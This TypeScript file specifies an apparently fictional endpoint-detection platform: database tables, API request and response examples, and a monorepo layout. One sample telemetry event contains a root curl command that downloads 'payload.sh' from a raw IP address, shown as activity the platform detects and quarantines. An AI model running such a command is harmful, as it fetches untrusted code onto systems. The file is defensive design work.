export interface TableField {
  name: string;
  type: string;
  constraints: string;
  description: string;
}

export interface TableSpec {
  name: string;
  description: string;
  fields: TableField[];
}

export interface ApiEndpointSpec {
  method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'WS';
  path: string;
  description: string;
  auth: string;
  requestBody?: string;
  responseBody: string;
}

export const DB_SCHEMA: TableSpec[] = [
  {
    name: 'tenants',
    description: 'Manages organizations requiring isolated security boundaries under a multi-tenant model.',
    fields: [
      { name: 'id', type: 'UUID', constraints: 'PRIMARY KEY, DEFAULT gen_random_uuid()', description: 'Unique identifier for the tenant.' },
      { name: 'name', type: 'VARCHAR(255)', constraints: 'NOT NULL', description: 'The registered commercial name of the enterprise.' },
      { name: 'tier', type: 'VARCHAR(50)', constraints: 'NOT NULL DEFAULT \'Standard\'', description: 'License tier (Standard, Enterprise, FedRAMP-High).' },
      { name: 'encryption_key_arn', type: 'VARCHAR(512)', constraints: 'NOT NULL', description: 'KMS key ARN used for envelope encryption of telemetry.' },
      { name: 'created_at', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NOT NULL DEFAULT NOW()', description: 'Record initialization date.' }
    ]
  },
  {
    name: 'users',
    description: 'Security operations center (SOC) personnel, administrators, and auditors.',
    fields: [
      { name: 'id', type: 'UUID', constraints: 'PRIMARY KEY, DEFAULT gen_random_uuid()', description: 'Unique identifier.' },
      { name: 'tenant_id', type: 'UUID', constraints: 'REFERENCES tenants(id) ON DELETE CASCADE', description: 'Owning tenant (Strict isolation barrier).' },
      { name: 'email', type: 'VARCHAR(255)', constraints: 'UNIQUE, NOT NULL', description: 'Corporate email address.' },
      { name: 'password_hash', type: 'VARCHAR(255)', constraints: 'NOT NULL', description: 'Argon2id cryptographic hash of the user password.' },
      { name: 'role', type: 'VARCHAR(64)', constraints: 'NOT NULL CHECK (role IN (\'SOC_Manager\', \'SOC_Analyst\', \'System_Admin\', \'Auditor\'))', description: 'Role-Based Access Control configuration.' },
      { name: 'mfa_secret_encrypted', type: 'TEXT', constraints: 'NOT NULL', description: 'AES-256-GCM encrypted TOTP secret.' },
      { name: 'last_login', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NULL', description: 'Last active timestamp.' }
    ]
  },
  {
    name: 'agents',
    description: 'Endpoints with host-level monitoring agents installed.',
    fields: [
      { name: 'id', type: 'UUID', constraints: 'PRIMARY KEY, DEFAULT gen_random_uuid()', description: 'Identifies the endpoint workstation/server.' },
      { name: 'tenant_id', type: 'UUID', constraints: 'REFERENCES tenants(id) ON DELETE CASCADE', description: 'Associated company.' },
      { name: 'hostname', type: 'VARCHAR(255)', constraints: 'NOT NULL', description: 'Node network hostname.' },
      { name: 'ip_address', type: 'VARCHAR(45)', constraints: 'NOT NULL', description: 'IPv4 or IPv6 network address.' },
      { name: 'os_family', type: 'VARCHAR(32)', constraints: 'NOT NULL CHECK (os_family IN (\'Windows\', \'Linux\'))', description: 'Shorthand OS indicator.' },
      { name: 'os_kernel_version', type: 'VARCHAR(255)', constraints: 'NOT NULL', description: 'Detailed kernel release details (e.g. 5.15.0-generic, NT 10.0).' },
      { name: 'agent_version', type: 'VARCHAR(32)', constraints: 'NOT NULL', description: 'SemVer string of installed agent package.' },
      { name: 'connection_status', type: 'VARCHAR(32)', constraints: 'NOT NULL CHECK (connection_status IN (\'Online\', \'Offline\', \'Unresponsive\', \'Compromised\'))', description: 'Current agent health status.' },
      { name: 'mtls_cert_serial', type: 'VARCHAR(128)', constraints: 'UNIQUE, NOT NULL', description: 'mTLS Client Certificate serial mapping for authentication.' },
      { name: 'last_heartbeat', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NOT NULL', description: 'Last active connection check-in.' }
    ]
  },
  {
    name: 'host_telemetry',
    description: 'Hot telemetry stream storing system process execution, DLL injection, and file metadata (PostgreSQL Partitioned Table).',
    fields: [
      { name: 'id', type: 'BIGSERIAL', constraints: 'PARTITION KEY', description: 'Global high-scale serial event index.' },
      { name: 'agent_id', type: 'UUID', constraints: 'REFERENCES agents(id) ON DELETE CASCADE', description: 'Originating host system.' },
      { name: 'timestamp', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NOT NULL', description: 'Precise hardware event extraction time.' },
      { name: 'event_type', type: 'VARCHAR(64)', constraints: 'NOT NULL CHECK (event_type IN (\'PROCESS_SPAWN\', \'FILE_MOD\', \'NET_CONN\', \'REGISTRY_WRITE\', \'MODULE_LOAD\'))', description: 'The intercepted audit category.' },
      { name: 'payload', type: 'JSONB', constraints: 'NOT NULL', description: 'Rich context structure containing command lines, PIDs, syscall registers, IP hashes.' },
      { name: 'risk_score', type: 'NUMERIC(3,2)', constraints: 'NOT NULL', description: 'Local heuristics engine score (0.00 to 1.00).' }
    ]
  },
  {
    name: 'threat_alerts',
    description: 'Incident detections evaluated by AI Engine, Yara-rules, or heuristics.',
    fields: [
      { name: 'id', type: 'UUID', constraints: 'PRIMARY KEY, DEFAULT gen_random_uuid()', description: 'Incident baseline tracking registry.' },
      { name: 'tenant_id', type: 'UUID', constraints: 'REFERENCES tenants(id) ON DELETE CASCADE', description: 'Scoped enterprise affected.' },
      { name: 'agent_id', type: 'UUID', constraints: 'REFERENCES agents(id) ON DELETE RESTRICT', description: 'Affected system node.' },
      { name: 'severity', type: 'VARCHAR(16)', constraints: 'NOT NULL CHECK (severity IN (\'Mild\', \'Moderate\', \'Severe\', \'Critical\'))', description: 'Standard SOC scale.' },
      { name: 'mitre_tactic', type: 'VARCHAR(128)', constraints: 'NULL', description: 'Mapped MITRE ATT&CK Tactic code (e.g. TA0003 - Persistence).' },
      { name: 'mitre_technique', type: 'VARCHAR(128)', constraints: 'NULL', description: 'Mapped MITRE ATT&CK Technique code (e.g. T1547.001 - Registry Run Keys).' },
      { name: 'detection_mechanism', type: 'VARCHAR(128)', constraints: 'NOT NULL', description: 'Heuristics, YARA, eBPF_Anomaly, Gemini_AI_Intel.' },
      { name: 'title', type: 'VARCHAR(256)', constraints: 'NOT NULL', description: 'Summary of flagged adversarial behavior.' },
      { name: 'description', type: 'TEXT', constraints: 'NOT NULL', description: 'Full analytical rundown.' },
      { name: 'status', type: 'VARCHAR(32)', constraints: 'NOT NULL DEFAULT \'New\' CHECK (status IN (\'New\', \'Triage\', \'In_Progress\', \'Resolved\', \'Suppressed\'))', description: 'Incident management life cycle.' },
      { name: 'remediation_action', type: 'TEXT', constraints: 'NULL', description: 'Remediation details deployed (e.g., Kill Process tree PID 4322, Quarantine Node).' },
      { name: 'created_at', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NOT NULL DEFAULT NOW()', description: 'Detection timestamp.' }
    ]
  },
  {
    name: 'security_audit_logs',
    description: 'Immutable database ledger mapping administrative action (CFR Title 21 compliant).',
    fields: [
      { name: 'id', type: 'UUID', constraints: 'PRIMARY KEY, DEFAULT gen_random_uuid()', description: 'Unique audit transaction identification.' },
      { name: 'tenant_id', type: 'UUID', constraints: 'REFERENCES tenants(id) ON DELETE RESTRICT', description: 'Enterprise sandbox tracker.' },
      { name: 'user_id', type: 'UUID', constraints: 'REFERENCES users(id) ON DELETE STRICT', description: 'SOC analyst or operational system daemon performing actions.' },
      { name: 'action', type: 'VARCHAR(128)', constraints: 'NOT NULL', description: 'Executed API endpoint action (e.g., AGENT_QUARANTINE, REMEDIATION_POL_UPDATE).' },
      { name: 'request_ip', type: 'VARCHAR(45)', constraints: 'NOT NULL', description: 'Source tracking IP.' },
      { name: 'user_agent', type: 'VARCHAR(512)', constraints: 'NULL', description: 'Browser identifier headers.' },
      { name: 'old_state_json', type: 'JSONB', constraints: 'NULL', description: 'Delta analysis prior to mutation.' },
      { name: 'new_state_json', type: 'JSONB', constraints: 'NULL', description: 'Delta analysis post mutation.' },
      { name: 'timestamp', type: 'TIMESTAMP WITH TIME ZONE', constraints: 'NOT NULL DEFAULT NOW()', description: 'Immutable action stamp.' }
    ]
  }
];

export const API_SPECS: ApiEndpointSpec[] = [
  {
    method: 'POST',
    path: '/api/v1/auth/login',
    description: 'Authenticates system administrators and analysts, initiating 2FA verification steps.',
    auth: 'None (Unauthenticated Public Endpoint with Global Rate Limit)',
    requestBody: `{
  "email": "analyst@cyberguard.net",
  "password": "StrongSecretPasswordHashStrength_99!",
  "totp_code": "489210"
}`,
    responseBody: `{
  "status": "authenticated",
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyY...",
  "refresh_token": "rt_98b1a37c0fc42f6...",
  "mfa_verified": true,
  "tenant_id": "426be23d-2bf0-4b9a-bbce-144cfab89e01",
  "user": {
    "id": "e9314c1d-114c-473d-862d-02ba2cb68b5a",
    "email": "analyst@cyberguard.net",
    "role": "SOC_Analyst",
    "scopes": ["agents:read", "alerts:manage", "remediation:trigger"]
  }
}`
  },
  {
    method: 'POST',
    path: '/api/v1/agents/register',
    description: 'Bootstrap registration routine for new Windows/Linux agents. Uses a single use cryptographic activation token. Generates dedicated client-specific PEM certificate.',
    auth: 'Pre-shared Enterprise Activation Key',
    requestBody: `{
  "activation_key": "CG_ACT_9831a2_d193fba72c0199e1af309b",
  "hostname": "PROD-SYS-SQL03",
  "ip_address": "10.140.24.81",
  "platform": "Linux",
  "os_kernel": "Linux 6.1.0-9-amd64",
  "agent_version": "v1.4.2",
  "csr": "-----BEGIN CERTIFICATE REQUEST-----\\nMIIChjCCAfICAQAwRDELMAkGA1UEBhMCVVMxFDASBgNVBAoMC0N5YmVyR3VhcmQx\\n..."
}`,
    responseBody: `{
  "agent_id": "ce51a84f-fc7c-48be-8065-27a1a09dbe9c",
  "mTLS_issued_cert": "-----BEGIN CERTIFICATE-----\\nMIIEDzCCAvegAwIBAgIUdTd72aBvV7f3964H1o4A6XpE6MswDQYJKoZIhvcNAQEL\\n...",
  "ca_chain": "-----BEGIN CERTIFICATE-----\\n...",
  "heartbeat_interval_seconds": 15,
  "remediation_channel": "ws://ingress.cyberguard.net/api/v1/ws/agents/ce51a84f-fc7c-48be-8065-27a1a09dbe9c"
}`
  },
  {
    method: 'POST',
    path: '/api/v1/telemetry/ingest',
    description: 'Bulk high-throughput telemetry ingestion pipeline invoked by running services.',
    auth: 'mTLS Client Certificate Verification',
    requestBody: `{
  "agent_id": "ce51a84f-fc7c-48be-8065-27a1a09dbe9c",
  "sequence_id": 9934102,
  "events": [
    {
      "timestamp": "2026-06-15T15:37:49Z",
      "event_type": "PROCESS_SPAWN",
      "pid": 10421,
      "ppid": 1,
      "bin_path": "/usr/bin/curl",
      "cmdline": "curl -s http://185.120.30.22/payload.sh --output /tmp/sh.bin",
      "uid": 0,
      "gid": 0,
      "sha256": "4b68abfc3f9e99e9..."
    }
  ]
}`,
    responseBody: `{
  "status": "ack",
  "processed_events": 1,
  "action_required": false
}`
  },
  {
    method: 'GET',
    path: '/api/v1/alerts',
    description: 'Queries tenant-specific alerts applying rigorous column filtering and pagination.',
    auth: 'JWT with scope: `alerts:read` + Same Tenant Scoping Context',
    requestBody: 'Query Parameters: severity=Critical, status=New, page=1, page_size=20',
    responseBody: `{
  "items": [
    {
      "id": "fe9310ca-cfb2-4db1-9c88-e9f0be2413fa",
      "agent_id": "ce51a84f-fc7c-48be-8065-27a1a09dbe9c",
      "hostname": "PROD-SYS-SQL03",
      "severity": "Critical",
      "mitre_tactic": "TA0011 - Command and Control",
      "mitre_technique": "T1105 - Ingress Tool Transfer",
      "title": "Suspicious External Tool Ingress Detected",
      "description": "The binary /usr/bin/curl was spawned as root user and attempted execution with terminal payload redirection.",
      "status": "New",
      "created_at": "2026-06-15T15:38:00Z"
    }
  ],
  "total": 1,
  "pages": 1,
  "current_page": 1
}`
  },
  {
    method: 'POST',
    path: '/api/v1/alerts/{alert_id}/remediate',
    description: 'Triggers real-time response playbook payload to the agent via WebSocket control block.',
    auth: 'JWT with scope: `remediation:trigger` (SOC Analyst+ only)',
    requestBody: `{
  "action": "QUARANTINE_NODE",
  "reason": "Suspicious malicious binary curl execution mapping zero-day shell payload transfer.",
  "parameters": {
    "network_isolation": true,
    "kill_processes": [10421],
    "file_quarantine": ["/tmp/sh.bin"]
  }
}`,
    responseBody: `{
  "incident_tracking_id": "incident_ce39b1a100ccff7",
  "agent_id": "ce51a84f-fc7c-48be-8065-27a1a09dbe9c",
  "status": "PLAYBOOK_DISPATCHED",
  "timestamp": "2026-06-15T15:38:12Z"
}`
  },
  {
    method: 'WS',
    path: '/api/v1/ws/alerts',
    description: 'Synchronizes live real-time security events to active user dashboards.',
    auth: 'JWT Query Parameter Verification',
    responseBody: `{
  "event_type": "ALERT_CREATED",
  "tenant_id": "426be23d-2bf0-4b9a-bbce-144cfab89e01",
  "payload": {
    "alert_id": "fe9310ca-cfb2-4db1-9c88-e9f0be2413fa",
    "title": "Suspicious External Tool Ingress Detected",
    "severity": "Critical",
    "hostname": "PROD-SYS-SQL03",
    "os_family": "Linux",
    "discovered_at": "2026-06-15T15:38:00Z"
  }
}`
  }
];

export const MONOREPO_TREE = {
  name: "cyberguard-bot-monorepo",
  type: "directory",
  children: [
    {
      name: "agents",
      type: "directory",
      children: [
        {
          name: "windows",
          type: "directory",
          children: [
            { name: "cmd", type: "directory", children: [{ name: "agent", type: "directory", children: [{ name: "main.go", type: "file" }] }] },
            { name: "pkg", type: "directory", children: [
              { name: "etw", type: "directory", children: [{ name: "collector.go", type: "file" }] },
              { name: "registry", type: "directory", children: [{ name: "monitor.go", type: "file" }] },
              { name: "network", type: "directory", children: [{ name: "divert.go", type: "file" }] },
              { name: "mtls", type: "directory", children: [{ name: "client.go", type: "file" }] }
            ] },
            { name: "Makefile", type: "file" },
            { name: "go.mod", type: "file" }
          ]
        },
        {
          name: "linux",
          type: "directory",
          children: [
            { name: "ebpf", type: "directory", children: [
              { name: "kern", type: "directory", children: [{ name: "syscalls.bpf.c", type: "file" }, { name: "network.bpf.c", type: "file" }] },
              { name: "user", type: "directory", children: [{ name: "loader.go", type: "file" }] }
            ] },
            { name: "pkg", type: "directory", children: [
              { name: "proc", type: "directory", children: [{ name: "collector.go", type: "file" }] },
              { name: "sandbox", type: "directory", children: [{ name: "isolate.go", type: "file" }] }
            ] },
            { name: "go.mod", type: "file" }
          ]
        }
      ]
    },
    {
      name: "backend",
      type: "directory",
      children: [
        {
          name: "app",
          type: "directory",
          children: [
            { name: "main.py", type: "file" },
            { name: "config.py", type: "file" },
            { name: "api", type: "directory", children: [
              { name: "deps.py", type: "file" },
              { name: "v1", type: "directory", children: [
                { name: "auth.py", type: "file" },
                { name: "agents.py", type: "file" },
                { name: "alerts.py", type: "file" },
                { name: "telemetry.py", type: "file" }
              ] }
            ] },
            { name: "core", type: "directory", children: [
              { name: "security.py", type: "file" },
              { name: "rbac.py", type: "file" },
              { name: "celery_app.py", type: "file" }
            ] },
            { name: "db", type: "directory", children: [
              { name: "session.py", type: "file" },
              { name: "base.py", type: "file" },
              { name: "models.py", type: "file" }
            ] },
            { name: "schemas", type: "directory", children: [{ name: "alert.py", type: "file" }, { name: "agent.py", type: "file" }] },
            { name: "workers", type: "directory", children: [{ name: "ai_analysis.py", type: "file" }, { name: "notifications.py", type: "file" }] }
          ]
        },
        { name: "requirements.txt", type: "file" },
        { name: "Dockerfile", type: "file" }
      ]
    },
    {
      name: "dashboard",
      type: "directory",
      children: [
        { name: "src", type: "directory", children: [
          { name: "components", type: "directory", children: [{ name: "AgentList.tsx", type: "file" }, { name: "AlertViewer.tsx", type: "file" }] },
          { name: "hooks", type: "directory", children: [{ name: "useWebsocket.ts", type: "file" }] },
          { name: "pages", type: "directory", children: [{ name: "index.tsx", type: "file" }, { name: "settings.tsx", type: "file" }] }
        ] },
        { name: "package.json", type: "file" },
        { name: "tailwind.config.js", type: "file" },
        { name: "Dockerfile", type: "file" }
      ]
    },
    {
      name: "infra",
      type: "directory",
      children: [
        {
          name: "docker",
          type: "directory",
          children: [
            { name: "docker-compose.yml", type: "file" },
            { name: "compose.prod.yml", type: "file" }
          ]
        },
        {
          name: "kubernetes",
          type: "directory",
          children: [
            { name: "ingress.yaml", type: "file" },
            { name: "backend-deployment.yaml", type: "file" },
            { name: "postgres-statefulset.yaml", type: "file" },
            { name: "redis-statefulset.yaml", type: "file" }
          ]
        },
        {
          name: "terraform",
          type: "directory",
          children: [
            { name: "main.tf", type: "file" },
            { name: "variables.tf", type: "file" },
            { name: "outputs.tf", type: "file" }
          ]
        }
      ]
    },
    {
      name: ".github",
      type: "directory",
      children: [
        {
          name: "workflows",
          type: "directory",
          children: [
            { name: "ci-cd.yml", type: "file" },
            { name: "security-scan.yml", type: "file" }
          ]
        }
      ]
    }
  ]
};
